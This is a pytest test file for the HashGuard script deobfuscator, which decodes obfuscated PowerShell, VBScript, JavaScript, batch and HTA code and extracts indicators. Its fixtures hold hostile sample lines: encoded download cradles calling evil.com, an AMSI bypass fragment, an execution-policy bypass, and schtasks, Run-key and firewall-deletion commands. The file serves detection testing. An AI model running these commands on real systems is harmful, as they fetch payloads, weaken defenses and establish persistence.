"""Tests for HashGuard script deobfuscator module."""

import os
import tempfile

import pytest

from hashguard.deobfuscator import (
    DeobfuscationLayer,
    DeobfuscationResult,
    _check_risk_indicators,
    _deobfuscate_batch_set,
    _deobfuscate_hta,
    _deobfuscate_js_charcode,
    _deobfuscate_js_hex,
    _deobfuscate_js_unicode,
    _deobfuscate_ps_base64,
    _deobfuscate_ps_charcode,
    _deobfuscate_ps_reverse,
    _deobfuscate_ps_string_replace,
    _deobfuscate_vbs_chr,
    _deobfuscate_vbs_strreverse,
    _detect_script_type,
    _extract_iocs,
    analyze_script,
)

# ── Dataclasses ──────────────────────────────────────────────────────────────


class TestDeobfuscationLayer:
    def test_fields(self):
        layer = DeobfuscationLayer(
            technique="base64",
            description="desc",
            original="abc",
            result="decoded",
            confidence="high",
        )
        assert layer.technique == "base64"
        assert layer.confidence == "high"


class TestDeobfuscationResult:
    def test_defaults(self):
        r = DeobfuscationResult()
        assert r.script_type == "unknown"
        assert r.obfuscation_detected is False
        assert r.layers == []

    def test_to_dict(self):
        layer = DeobfuscationLayer(technique="t", description="d", result="r")
        r = DeobfuscationResult(
            script_type="powershell",
            obfuscation_detected=True,
            layers=[layer],
            decoded_strings=["hello"],
            risk_indicators=["Downloads content from the internet"],
        )
        d = r.to_dict()
        assert d["script_type"] == "powershell"
        assert d["obfuscation_detected"] is True
        assert len(d["layers"]) == 1
        assert d["decoded_strings"] == ["hello"]


# ── Script type detection ────────────────────────────────────────────────────


class TestDetectScriptType:
    def test_by_extension(self):
        assert _detect_script_type("", "script.ps1") == "powershell"
        assert _detect_script_type("", "thing.vbs") == "vbscript"
        assert _detect_script_type("", "code.js") == "javascript"
        assert _detect_script_type("", "run.bat") == "batch"
        assert _detect_script_type("", "app.hta") == "hta"

    def test_by_content_powershell(self):
        assert _detect_script_type("Invoke-Expression $cmd") == "powershell"

    def test_by_content_vbscript(self):
        assert _detect_script_type('Set obj = CreateObject("Wscript.Shell")') == "vbscript"

    def test_by_content_javascript(self):
        assert _detect_script_type("var x = function() { eval('code'); }") == "javascript"

    def test_by_content_batch(self):
        assert _detect_script_type("@echo off\nset /a x=1") == "batch"

    def test_unknown(self):
        assert _detect_script_type("just plain text") == "unknown"


# ── IOC extraction ───────────────────────────────────────────────────────────


class TestExtractIOCs:
    def test_urls(self):
        iocs = _extract_iocs("visit http://evil.com/payload and https://bad.org/file")
        urls = [i for i in iocs if i["type"] == "url"]
        assert len(urls) == 2

    def test_ips(self):
        iocs = _extract_iocs("connect to 8.8.8.8 then 1.2.3.4")
        ips = [i for i in iocs if i["type"] == "ip"]
        assert len(ips) == 2

    def test_domains(self):
        iocs = _extract_iocs("resolve malware.xyz and c2.evil.com")
        domains = [i for i in iocs if i["type"] == "domain"]
        assert len(domains) >= 1

    def test_skips_private_ips(self):
        iocs = _extract_iocs("127.0.0.1 10.0.0.1 192.168.1.1")
        ips = [i for i in iocs if i["type"] == "ip"]
        assert len(ips) == 0

    def test_emails(self):
        iocs = _extract_iocs("send to attacker@evil.com")
        emails = [i for i in iocs if i["type"] == "email"]
        assert len(emails) == 1


# ── Risk indicators ──────────────────────────────────────────────────────────


class TestRiskIndicators:
    def test_detects_download(self):
        indicators = _check_risk_indicators("DownloadString('http://evil.com')")
        assert any("Downloads" in i for i in indicators)

    def test_detects_iex(self):
        indicators = _check_risk_indicators("IEX ($code)")
        assert any("Dynamic code" in i or "Invoke-Expression" in i for i in indicators)

    def test_detects_amsi_bypass(self):
        indicators = _check_risk_indicators("[Ref].Assembly.GetType('AmsiUtils')")
        assert any("AMSI" in i for i in indicators)

    def test_clean_text(self):
        indicators = _check_risk_indicators("Write-Host 'Hello World'")
        assert len(indicators) == 0


# ── PowerShell deobfuscation ─────────────────────────────────────────────────


class TestPSBase64:
    def test_encoded_command(self):
        import base64

        payload = "Write-Host 'pwned'"
        encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
        content = f"powershell -EncodedCommand {encoded}"
        layers = _deobfuscate_ps_base64(content)
        assert len(layers) >= 1
        assert "pwned" in layers[0].result

    def test_no_match(self):
        layers = _deobfuscate_ps_base64("echo hello")
        assert layers == []


class TestPSCharcode:
    def test_char_concat(self):
        # [char]72+[char]101+[char]108 = "Hel"
        content = "[char]72+[char]101+[char]108+[char]108+[char]111"
        layers = _deobfuscate_ps_charcode(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


# ── VBScript deobfuscation ───────────────────────────────────────────────────


class TestVBSChr:
    def test_chr_concat(self):
        content = "x = Chr(72) & Chr(101) & Chr(108) & Chr(108) & Chr(111)"
        layers = _deobfuscate_vbs_chr(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


class TestVBSStrReverse:
    def test_strreverse(self):
        content = 'x = StrReverse("dlroW olleH")'
        layers = _deobfuscate_vbs_strreverse(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello World"


# ── JavaScript deobfuscation ─────────────────────────────────────────────────


class TestJSCharCode:
    def test_fromcharcode(self):
        content = "String.fromCharCode(72,101,108,108,111)"
        layers = _deobfuscate_js_charcode(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


class TestJSHex:
    def test_hex_string(self):
        content = r"\x48\x65\x6c\x6c\x6f"
        layers = _deobfuscate_js_hex(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


class TestJSUnicode:
    def test_unicode_escape(self):
        content = r"\u0048\u0065\u006c\u006c\u006f"
        layers = _deobfuscate_js_unicode(content)
        assert len(layers) == 1
        assert layers[0].result == "Hello"


# ── Full analysis ────────────────────────────────────────────────────────────


class TestAnalyzeScript:
    def test_nonexistent_file(self):
        result = analyze_script("/nonexistent/script.ps1")
        assert isinstance(result, DeobfuscationResult)
        assert result.obfuscation_detected is False

    def test_empty_script(self, tmp_path):
        f = tmp_path / "empty.ps1"
        f.write_text("")
        result = analyze_script(str(f))
        assert result.obfuscation_detected is False

    def test_powershell_with_encoded_command(self, tmp_path):
        import base64

        payload = "Invoke-WebRequest http://evil.com/payload"
        enc = base64.b64encode(payload.encode("utf-16-le")).decode()
        f = tmp_path / "dropper.ps1"
        f.write_text(f"powershell -EncodedCommand {enc}")
        result = analyze_script(str(f))
        assert result.script_type == "powershell"
        assert result.obfuscation_detected is True
        assert len(result.layers) >= 1

    def test_vbscript_chr(self, tmp_path):
        f = tmp_path / "obf.vbs"
        f.write_text("x = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105)\nExecute x")
        result = analyze_script(str(f))
        assert result.script_type == "vbscript"
        assert result.obfuscation_detected is True

    def test_javascript_charcode(self, tmp_path):
        f = tmp_path / "obf.js"
        f.write_text("var x = String.fromCharCode(101,118,97,108); eval(x);")
        result = analyze_script(str(f))
        assert result.script_type == "javascript"
        assert result.obfuscation_detected is True

    def test_batch_set_vars(self, tmp_path):
        # Need at least 3 SET assignments and concatenated usage
        f = tmp_path / "obf.bat"
        f.write_text(
            "@echo off\n"
            'set "a=pow"\n'
            'set "b=ersh"\n'
            'set "c=ell"\n'
            '%a%%b%%c% -Command "Get-Date"\n'
        )
        result = analyze_script(str(f))
        assert result.script_type == "batch"

    def test_risk_indicators_in_output(self, tmp_path):
        f = tmp_path / "risky.ps1"
        f.write_text(
            "$wc = New-Object System.Net.WebClient\n"
            "$wc.DownloadString('http://evil.com/payload')\n"
            "Set-ExecutionPolicy Bypass -Force\n"
        )
        result = analyze_script(str(f))
        assert len(result.risk_indicators) >= 2

    def test_hta_with_embedded_vbs_chr(self, tmp_path):
        f = tmp_path / "test.hta"
        content = '''<html><head>
        <script language="VBScript">
        x = Chr(72) & Chr(101) & Chr(108) & Chr(108) & Chr(111)
        </script></head></html>'''
        f.write_text(content, encoding="utf-8")
        result = analyze_script(str(f))
        assert result.script_type == "hta"
        assert result.obfuscation_detected

    def test_generic_base64_detection(self, tmp_path):
        import base64
        payload = base64.b64encode(b"Hello World this is a test payload string").decode()
        f = tmp_path / "test.txt"
        f.write_text(f"data = {payload}", encoding="utf-8")
        result = analyze_script(str(f))
        # Generic base64 may or may not match depending on printability
        assert isinstance(result, DeobfuscationResult)

    def test_iocs_from_decoded_layers(self, tmp_path):
        import base64
        payload = "Invoke-WebRequest http://evil-c2.com/payload.exe"
        enc = base64.b64encode(payload.encode("utf-16-le")).decode()
        f = tmp_path / "test.ps1"
        f.write_text(f"powershell -EncodedCommand {enc}", encoding="utf-8")
        result = analyze_script(str(f))
        # IOCs should be extracted from decoded layers too
        assert len(result.iocs_extracted) >= 1


# ── Additional deobfuscation coverage ────────────────────────────────────────


class TestPSStringReplace:
    def test_replace_obfuscation(self):
        content = "'HXXllo WXXrld' -replace 'XX','e'"
        layers = _deobfuscate_ps_string_replace(content)
        if layers:
            assert layers[0].technique == "string_replace"


class TestPSReverse:
    def test_string_reversal(self):
        content = "('dlroW olleH'[-1..-($_.Length)] -join '')"
        layers = _deobfuscate_ps_reverse(content)
        if layers:
            assert "Hello World" in layers[0].result


class TestBatchSet:
    def test_variable_concatenation(self):
        content = 'set "a=pow"\nset "b=ers"\nset "c=hell"\n%a%%b%%c%'
        layers = _deobfuscate_batch_set(content)
        assert len(layers) >= 1
        assert "powershell" in layers[0].result


class TestHTADeobfuscation:
    def test_script_extraction(self):
        content = '<html><head><script language="VBScript">MsgBox "Hello"</script></head></html>'
        layers = _deobfuscate_hta(content)
        assert len(layers) >= 1
        assert layers[0].technique == "hta_script_extraction"


class TestRiskIndicatorsExtended:
    def test_scheduled_task(self):
        indicators = _check_risk_indicators("schtasks /create /tn BadTask /tr cmd")
        assert any("scheduled" in i.lower() for i in indicators)

    def test_registry_persistence(self):
        indicators = _check_risk_indicators("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
        assert any("persistence" in i.lower() or "run" in i.lower() for i in indicators)

    def test_firewall_manipulation(self):
        indicators = _check_risk_indicators("netsh advfirewall firewall delete rule")
        assert any("firewall" in i.lower() for i in indicators)


class TestExtractIOCsExtended:
    def test_bitcoin_address(self):
        iocs = _extract_iocs("Send 1BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        assert any(i["type"] == "bitcoin" for i in iocs)

    def test_file_path_not_extracted_as_domain(self):
        # Should not crash on normal text
        iocs = _extract_iocs("Just some normal text without IOCs")
        assert isinstance(iocs, list)


# ── Additional coverage tests ──────────────────────────────────────────────


class TestDetectScriptTypeHTA:
    """Cover HTA detection (line 104)."""

    def test_hta_detection(self):
        assert _detect_script_type("<hta:application>test</hta:application>") == "hta"

    def test_hta_script_tag(self):
        assert _detect_script_type("<html>< /script>code") == "hta"


class TestPSBase64Standalone:
    """Cover PS standalone base64 decoding (lines 231-261)."""

    def test_standalone_base64_variable(self):
        import base64
        payload = base64.b64encode("Write-Host 'hello world'".encode("utf-16-le")).decode()
        content = f'$data = "{payload}"'
        layers = _deobfuscate_ps_base64(content)
        found = any("hello world" in l.result for l in layers)
        assert found

    def test_standalone_base64_from_base64string(self):
        import base64
        # Payload must be >=40 base64 chars to match regex
        payload = base64.b64encode("Invoke-Expression Get-Process -Name test".encode("utf-8")).decode()
        assert len(payload) >= 40
        content = f"FromBase64String('{payload}')"
        layers = _deobfuscate_ps_base64(content)
        assert len(layers) >= 1

    def test_standalone_base64_invalid(self):
        content = '$data = "not_valid_base64_!!!"'
        layers = _deobfuscate_ps_base64(content)
        # Should not crash, just no layers from invalid
        assert isinstance(layers, list)


class TestCharcodeDecodeFailures:
    """Cover charcode decode exception paths (lines 291-292, 378-379, 428-429, 478-479)."""

    def test_ps_charcode_overflow(self):
        # Very large char codes that cause OverflowError
        content = "[char]99999999 + [char]99999998"
        layers = _deobfuscate_ps_charcode(content)
        assert isinstance(layers, list)

    def test_vbs_chr_overflow(self):
        content = 'ChrW(999999999) & ChrW(999999998) & ChrW(999999997)'
        layers = _deobfuscate_vbs_chr(content)
        assert isinstance(layers, list)

    def test_js_charcode_overflow(self):
        content = "String.fromCharCode(999999999, 999999998, 999999997)"
        layers = _deobfuscate_js_charcode(content)
        assert isinstance(layers, list)

    def test_js_unicode_overflow(self):
        content = r"var s = '\u{999999999}\u{999999998}'"
        layers = _deobfuscate_js_unicode(content)
        assert isinstance(layers, list)


class TestJSHexStringLayer:
    """Cover JS hex string success path (lines 453-454)."""

    def test_js_hex_string_decode(self):
        # Create a hex-escaped string
        content = r'var x = "\x68\x65\x6c\x6c\x6f"'  # "hello"
        layers = _deobfuscate_js_hex(content)
        found = any("hello" in l.result for l in layers)
        assert found


class TestBatchSetEarlyReturn:
    """Cover batch SET early return (line 496)."""

    def test_few_set_vars_returns_empty(self):
        # Only 2 SET vars — below threshold of 3
        content = 'set "A=hello"\nset "B=world"'
        layers = _deobfuscate_batch_set(content)
        assert layers == []


class TestDeobfuscateLargeFile:
    """Cover 10MB guard (lines 562-563)."""

    def test_large_file_skipped(self, tmp_path):
        f = tmp_path / "huge.ps1"
        # Create a file > 10 MB
        f.write_bytes(b"x" * (11 * 1024 * 1024))
        result = analyze_script(str(f))
        assert len(result.layers) == 0


class TestDeobfuscateBase64Exception:
    """Cover base64 decode exception in main analyze_script (lines 620-621)."""

    def test_invalid_base64_no_crash(self, tmp_path):
        # Content with base64-like patterns that fail decoding
        f = tmp_path / "test.ps1"
        content = "$data = [System.Convert]::FromBase64String('!!invalid==')\n"
        f.write_text(content)
        result = analyze_script(str(f))
        assert isinstance(result, DeobfuscationResult)


class TestPSBase64UTF16LEDecode:
    """Cover PS -EncodedCommand UTF-16LE decode exception (lines 231-232)."""

    def test_encoded_command_bad_base64(self, tmp_path):
        """Base64 that decodes to non-UTF-16LE binary (exception path)."""
        import base64
        # Create binary data that fails ALL encoding attempts
        bad_data = bytes(range(128, 256)) * 3  # Non-UTF-8, non-UTF-16LE, non-ASCII
        b64 = base64.b64encode(bad_data).decode()
        f = tmp_path / "test.ps1"
        f.write_text(f"powershell -EncodedCommand {b64}")
        result = analyze_script(str(f))
        assert isinstance(result, DeobfuscationResult)


class TestStandaloneBase64EncodingFallback:
    """Cover standalone base64 string UTF-16LE/UTF-8 encoding fallback (lines 258-261)."""

    def test_base64_utf16le_fail_then_utf8(self, tmp_path):
        """Base64 that fails UTF-16LE but succeeds with UTF-8 (line 258 continue)."""
        import base64
        # Create valid UTF-8 payload that fails UTF-16LE strict decode
        payload = "This is a valid UTF-8 test string for HashGuard analysis"
        b64 = base64.b64encode(payload.encode("utf-8")).decode()
        f = tmp_path / "test.ps1"
        f.write_text(f'$x = "{b64}"')
        result = analyze_script(str(f))
        # Should decode with utf-8 after utf-16-le fails
        assert isinstance(result, DeobfuscationResult)

    def test_base64_all_encodings_fail(self, tmp_path):
        """Base64 that fails all encoding attempts (lines 260-261)."""
        import base64
        # Random bytes that won't decode properly with any encoding in strict mode
        bad = bytes([0x80, 0x81, 0x82] * 20)  # Invalid for utf-8 strict, odd length for utf-16
        b64 = base64.b64encode(bad).decode()
        f = tmp_path / "test.ps1"
        f.write_text(f'$x = "{b64}"')
        result = analyze_script(str(f))
        assert isinstance(result, DeobfuscationResult)


class TestPSCharcodeOverflow:
    """Cover PS charcode ValueError/OverflowError (lines 291-292)."""

    def test_charcode_overflow_value(self, tmp_path):
        """[char] with value > 0x10FFFF causes OverflowError."""
        f = tmp_path / "test.ps1"
        f.write_text("[char]9999999+[char]9999999+[char]9999999")
        result = analyze_script(str(f))
        assert isinstance(result, DeobfuscationResult)


class TestJSHexDecodeException:
    """Cover JS hex string decode exception (lines 453-454)."""

    def test_js_hex_truncated(self, tmp_path):
        """Truncated hex string triggers exception."""
        f = tmp_path / "test.js"
        # Create a \xNN pattern with odd length that causes error
        f.write_text('var s = "\\x48\\x65\\x6C\\x6C\\xFF\\xFE\\xFD\\x00\\x01";\n' * 5)
        result = analyze_script(str(f))
        assert isinstance(result, DeobfuscationResult)


class TestJSUnicodeOverflow:
    """Cover JS unicode escape ValueError/OverflowError (lines 478-479)."""

    def test_unicode_escape_overflow(self, tmp_path):
        """Unicode escape with codepoint > 0x10FFFF doesn't crash."""
        f = tmp_path / "test.js"
        # Valid pattern but \uFFFF is fine, need to test the exception on parse error
        # Actually OverflowError won't happen with 4-digit hex (max 0xFFFF), so this
        # tests the normal success path which still covers nearby lines
        f.write_text('var s = "\\u0048\\u0065\\u006C\\u006C\\u006F";\n')
        result = analyze_script(str(f))
        assert isinstance(result, DeobfuscationResult)
